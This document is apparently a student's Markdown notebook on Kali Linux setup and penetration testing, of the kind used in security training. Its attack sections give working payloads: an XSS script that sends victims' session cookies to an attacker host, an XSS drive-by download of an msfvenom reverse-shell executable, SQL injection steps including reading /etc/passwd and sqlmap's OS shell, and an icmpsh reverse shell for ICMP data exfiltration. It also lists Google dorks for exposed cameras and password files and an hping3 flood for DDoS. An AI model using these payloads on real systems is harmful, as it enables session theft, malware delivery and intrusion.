# Kali setup
## Share with host machine
In virtual box

 - Select the kali machine
 - Click on "Configuration"
 - Tab "Shared folders"
 - Add "Permanent folder"

Folder path: C:\sci-ospt\kali-share  
Folder name: kali-share  
Read-only: false  
Mount automatically: true  
Mount point: /kali-share  
Permanent configuration: true

## nvm (Node Version Manager)

https://github.com/nvm-sh/nvm#install--update-script

    curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash
    export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] && printf %s "${HOME}/.nvm" || printf %s "${XDG_CONFIG_HOME}/nvm")"
    [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" # This loads nvm
    
    nvm install 18

## FoxyProxy
Firefox plugin
https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/

## Cookie Manager
Firefox plugin  
Used to reuse fetched auth / session cookies  
https://addons.mozilla.org/fr/firefox/addon/a-cookie-manager/

## Docker

### Install
https://www.kali.org/docs/containers/installing-docker-on-kali/

To install Docker on Kali you need to remember that there is already a package named “docker”, therefore Docker has to be installed under a different name. If you install docker you will not end up with the container version. The version we will be installing is named docker.io. All commands are the same however, so running docker on the command line will be the appropriate command.


## Dradis CE
Allows to store information.  
Unfortunately, there's no way to export nodes but a copy paste do the job

### Install
**DO NOT USE** kali documentation: https://www.kali.org/tools/dradis/

Use the official installation documentation instead:  
https://dradisframework.com/ce/documentation/ruby.html (I'm using ruby 3.1.2)  
https://dradisframework.com/ce/documentation/install_kali.html  
https://dradisframework.com/ce/documentation/install_git.html

### Getting started
HINT: This will use a standalone terminal

    cd ~/dradis-ce
    ./bin/rails server

Ouput:

    ┌──(kali㉿kali)-[~/dradis-ce]
    └─$ ./bin/rails server
    NOTE: nokogumbo: Using Nokogiri::HTML5 provided by Nokogiri. See
    https://github.com/sparklemotion/nokogiri/issues/2205 for more information.
    => Booting Puma
    => Rails 6.1.6.1 application starting in development 
    => Run `bin/rails server --help` for more startup options
    Puma starting in single mode...
    * Puma version: 5.6.4 (ruby 3.1.2-p20) ("Birdie's Version")
    * Min threads: 5
    * Max threads: 5
    * Environment: development
    *         PID: 313302
    * Listening on http://127.0.0.1:3000
    * Listening on http://[::1]:3000
    * Use Ctrl-C to stop

**Access address**
http://127.0.0.1:3000

### Import data

 - Click on the "Upload" tab
 - Choose a tool
 - Choose a file
 - Read "Output console" to check result is ok
#### Importable files
 - nmap -`Dradis::Plugins::Nmap`, see [nmap / export](./tools/tools.md#nikto)
 - nikto -`Dradis::Plugins::Nikto`, see [nikto / export](./tools/tools.md#nikto)
 - metasploit-framework - `Dradis::Plugins::Metasploit`, see [metasploit
   framework / export database](./tools/tools.md#Export database)

### Reset
https://dradisframework.com/ce/documentation/reset.html
#### Instance reset

    cd ~/dradis-ce/
    bundle exec thor dradis:reset

## flameshot (screenshot)
### Install

    apt install flameshot
### Configuration

- Open flameshot from the menu
    - This should open the flameshot trail icon (a flame - top right of the screen)
- Right-click on it and select "Configuration"
- Go to the "General" tab
- Set "Save Path" to `/kali-share/screenshots`
- Check "Use fixed path for screenshots to save
- Preferred save file extension `jpeg`


### Keyboard shortcuts
In kali

- Open the menu
- Type "keyboard"
- Open the "Keyboard" application
- Select the "Application Shortcuts" tab

Shortcut "Print": `flameshot gui -s`  
Shortcut "Shift+Print": `flameshot gui`

## Immunity debugger
https://immunityinc.com/products/debugger/

# Pentest
## Frameworks

- https://attack.mitre.org/
- https://owasp.org/

## Phases

  - Pre-engagement
  - Interactions
  - Intelligence Gathering
  - Threat Modeling
  - Vulnerability Analysis
  - Exploitation
  - Post Exploitation
  - Reporting

## Pre-engagement

Write an agreement (out of prison card)

  - Scope
  - Timeframe

Separate
  - Ransomeware
  - DDoS
  - Social engineering

## Intelligence gathering

### Tools

See [tools page](./tools/tools.md)

### Google Hacks / dorks
  - camera linksys inurl:main.cgi
  - intitle:"toshiba network camera - User login"
  - ext:php
  - "SquirrelMail vesion 1.4" inurl:src ext:php
  - intitle:"Welcome to Windows Small Business Server 2003"
  - ext:pwd inurl:(service|authors|administrators|users) "# - Frontpage"
  - intitle:"index of /" password.txt

### Knowledge databases
  - https://www.exploit-db.com/ - Exploit DB
  - https://www.mend.io/vulnerability-database/ - Vulns DB
  - https://cve.mitre.org/data/refs/refmap/source-OSVDB.html - OSVDB to CVE
  - https://www.shodan.io/ - Connected devices

### Scan
> Jackpot if these ports are open: 21, 80, 139, 445

Commands:
  - nmap
  - hping3 - nmap with traceroute
    - DDoS with `--flood`
#### Export (for dradis)

    nmap -sV -oX - <ip> > /kali-share/nmap-<ip>.xml
    
#### Vulnerability scan

    nmap -v --script vuln <ip>
    
#### Auth scan

    nmap -v --script auth <ip>

#### Noisy scan

    nmap -p- -sV -T4 <ip>

  - `-p-` all ports
  - `-T4` set timing template
    - paranoid (0)
    - sneaky (1)
    - polite (2)
    - normal (3)
    - aggressive (4)
    - insane (5)
  - `-sV` get service versions

### Ports
#### FTP - 21

    nc <ip> 21

#### HTTP - 80

Commands:
  - dirb
  - nikto
  
Tools:
  - burpsuite
  - dirbuster

#### MiniServ (Webmin) - 10000, 20000
Go to `https://<ip>:10000/`

#### NETBIOS-SSN / SMB - 139, 445

    enum4linux -a <ip> >> /kali-share/enum4linux-<ip>.txt

#### SNMP (Simple Noetwork Management Protocol) - UDP 161, UDP 162
	
    onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <ip>
    snmpwalk -c public <ip> -v1
    snmpset

## Reporting

https://pentestreports.com/

# Training
See the [training page](./training/training.md)

# Attacks
## Xmas attack

    sudo nmap -sX <ip> -p<port>
    
For UDP use -sU

## Null attack

    sudo nmap -sN <ip> -p<port>
    
For UDP use -sU
## XSS

### Payloads
#### Simple
    <script>alert('XSS')</script>
    
#### Cookie forwarding
    <script>document.write('<img src="http://<attacker-ip>:<listening-port>/?'+document.cookie+'" />');</script>

##### Listening with python http server
    python3 -m http.server <listening-port>

Will allow to get the session cookies of users

#### Malware download

    <script>var link = document.createElement('a');
    link.href = 'http://<attacker-ip>/document.exe'; // document.exe is the malware
    link.download = '';
    document.body.appendChild(link);
    link.click();</script>

Create a shell reversal with `msfvenom`

    msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker listening port> EXITFUNC=thread -f exe -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai > /var/www/html/document.exe

## SQL Injection
### Principle 
Find any input which will be part of a SQL Query

Inputs examples:
  - Form field input
  - URL parameter

In the input vulnerable to SQL injection, insert:

    ' or 1=1 --


Finishing the query with `;` instead of `--` will most likely end up throwing an error

### Exploitation

Step 1: Find out the number of columns fetched

    ' ORDER BY <num> --
Increment `<num>` until an error is thrown

Step 2: Display injected data

    ' UNION SELECT 1,2,3,...,<num> --

This inject "1", "2"... in the query's result.  
If you are manipulating a php page with an ID like `edit.php?id=1' UNION SELECT 1,2,3,4--`, you can change the id until your data is displayed

Step 3: Extract information

Once your data is displayed, switch from data injection to data extraction by replacing `UNION SELECT 1,2,3,4` with something like

    UNION SELECT @@version, user() ...

Useful functions:
  - `@@version` Version of the SQL server
  - `user()` Current user running the query
  - `LOAD_FILE('/etc/passwd')` Loads a requested file
  - `UPLOAD_FILE('<filepath>')` That could be used with XSS to upload a backdoor

### Tool

#### sqlmap  
automatic SQL injection tool   
https://www.kali.org/tools/sqlmap/  
https://manpages.org/sqlmap

sqlmap goal is to detect and take advantage of SQL injection vulnerabilities in web applications. Once it detects one or more SQL injections on the target host, the user can choose among a variety of options to perform an extensive back-end database management system fingerprint, retrieve DBMS session user and database, enumerate users, password hashes, privileges, databases, dump entire or user’s specific DBMS tables/columns, run his own SQL statement, read specific files on the file system and more.

##### Usage

    sqlmap -u "<page with sql inj. vuln>" --cookie "<session cookie>"

Options:
 - `--dump` SQL dump of the database
 - `--os-shell` Prompt for an interactive operating system shell  
Needs to know which web application language the web server supports
 - `--sql-shell` Prompt for an interactive SQL shell

# Data exfiltration
## ICMP - Internet Control Message Protocol

**Goal:** Extract data through the ICM protocol  
**How:** Using impacket and icmpsh

ICMP is a protocol intented to be lightweight (small messages)  
Impacket helps chunk data to extract them using icmpsh  
icmpsh makes a reversal shell between target and attacker

### Tools

Install python-pip

    sudo apt install python3-pip

Install impacket

    sudo git clone https://github.com/SecureAuthCorp/impacket.git
    sudo pip3 install -r /<git cloning path>/impacket/requirements.txt
    sudo python3 /<git cloning path>/impacket/setup.py install

Install icmpsh

    sudo git clone https://github.com/bdamele/icmpsh.git
    cd icmpsh

Insert in `/etc/sysctl.conf`

    net.ipv4.icmp_echo_ignore_all=1


### Usage
#### Attacker machine

    sudo ./icmpsh_m.py <attacker-ip> <target-ip>

#### Target machine

You need to upload a icmpsh tool on the target machine first

##### Send test  

    icmpsh.exe -t <attacker-ip> -r

##### Open reversal
    icmpsh.exe -t <attacker-ip>

# Lexical
## Samba
Search also: smb

# Learning

  - [Offensive Security - Penetrations Testing Bootcamp](https://github.com/phr85/swiss-cyber-defence/tree/main/Courses/Offensive%20Security%20-%20Penetrations%20Testing%20Bootcamp)